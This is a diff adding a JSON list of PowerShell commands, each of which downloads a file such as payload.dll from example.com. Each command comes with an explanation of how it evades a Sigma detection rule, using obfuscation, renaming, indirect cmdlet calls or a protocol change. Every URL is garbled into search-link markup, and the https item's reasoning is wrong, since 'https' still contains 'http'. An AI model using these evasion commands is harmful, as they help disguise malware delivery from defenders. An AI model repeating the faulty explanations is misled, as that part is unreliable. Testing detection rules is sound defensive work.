@@ -1,0 +1,26 @@
+[
+  {
+    "output": "powershell.exe -Command \"(New-Object System.Net.WebClient).DownloadFile('[http://example.com/test.dll](https://www.google.com/search?q=http://example.com/test.dll)', 'C:\\temp\\test.dll')\"",
+    "explanation": "Bypasses the rule by using the .NET WebClient class to download the file. The Sigma rule specifically looks for Invoke-WebRequest, Invoke-RestMethod, IRM, or IWR, leaving other native download methods undetected."
+  },
+  {
+    "output": "powershell.exe -Command \"I`w`r -Uri [http://example.com/test.dll](https://www.google.com/search?q=http://example.com/test.dll) -O`u`t`F`i`l`e C:\\temp\\test.dll\"",
+    "explanation": "Utilizes PowerShell backtick obfuscation. Since the log source is process_creation (Event ID 1 or 4688), the SIEM evaluates the raw command line string. The backticks break the exact string matches for 'IWR' and 'OutFile'."
+  },
+  {
+    "output": "powershell.exe -Command \"Invoke-WebRequest -Uri '[http://example.com/payload.txt](https://www.google.com/search?q=http://example.com/payload.txt)' -OutFile 'C:\\temp\\payload.txt'; Rename-Item -Path 'C:\\temp\\payload.txt' -NewName 'payload.dll'\"",
+    "explanation": "Bypasses the strict '.dll' string requirement. The file is downloaded with a different extension (.txt) and then renamed to .dll, meaning the initial process creation command line never contains the '.dll' string."
+  },
+  {
+    "output": "powershell.exe -Command \"Invoke-WebRequest -Uri [https://example.com/test.dll](https://www.google.com/search?q=https://example.com/test.dll) -OutFile C:\\temp\\test.dll\"",
+    "explanation": "Bypasses the 'http' string requirement by simply using 'https'. The rule explicitly requires the string 'http' in the CommandLine|contains|all section, so using a secure protocol evades the logic."
+  },
+  {
+    "output": "powershell.exe -Command \"Invoke-WebRequest -Uri '[http://example.com/payload](https://www.google.com/search?q=http://example.com/payload)' -OutFile 'C:\\Windows\\Tasks\\payload.tmp'; Rename-Item 'C:\\Windows\\Tasks\\payload.tmp' 'payload.dll'\"",
+    "explanation": "The rule enforces a rigid detection pattern that requires both 'OutFile' and '.dll' to appear within the same command line string. By saving the downloaded file with a temporary extension like '.tmp' and subsequently renaming it to '.dll' in a separate statement or command, the requirement for '.dll' in the initial process creation log is not met, breaking the 'contains|all' logic."
+  },
+  {
+    "output": "powershell.exe -Command \"$iwr = Get-Command 'Invoke-Web*' | Select-Object -First 1; &$iwr -Uri '[http://example.com/payload.dll](https://www.google.com/search?q=http://example.com/payload.dll)' -o 'C:\\Windows\\Tasks\\payload.dll'\"",
+    "explanation": "The detection logic relies on a trailing space after the cmdlet names (e.g., 'Invoke-WebRequest ') or specific parameters like 'OutFile'. By calling the cmdlet indirectly through an alias like '-o' instead of '-OutFile', or using wildcard syntax resolution, the literal keyword checks inside the 'selection' filters are successfully evaded."
+  }
+]
